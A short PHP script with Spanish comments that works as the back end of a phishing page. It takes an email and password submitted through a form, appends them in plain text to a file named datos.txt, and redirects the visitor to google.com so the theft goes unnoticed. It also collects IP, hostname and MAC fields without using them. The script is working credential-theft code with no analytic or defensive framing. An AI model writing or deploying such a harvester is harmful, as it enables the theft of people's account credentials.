<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capturar los datos del formulario
    $email = $_POST['email'];
	$password = $_POST['password'];
	$ip = $_POST['ip'];
	$hostname = $_POST['hostname'];
	$mac = $_POST['mac'];

    // Crear la línea de texto que se va a guardar
    $linea = "Email: $email | Password: $password\n";

    // Guardar en el archivo 'datos.txt'
    $archivo = './datos.txt';
    file_put_contents($archivo, $linea, FILE_APPEND);

    header("Location: https://google.com");
} else {
    echo "Método no permitido.";
}
?>
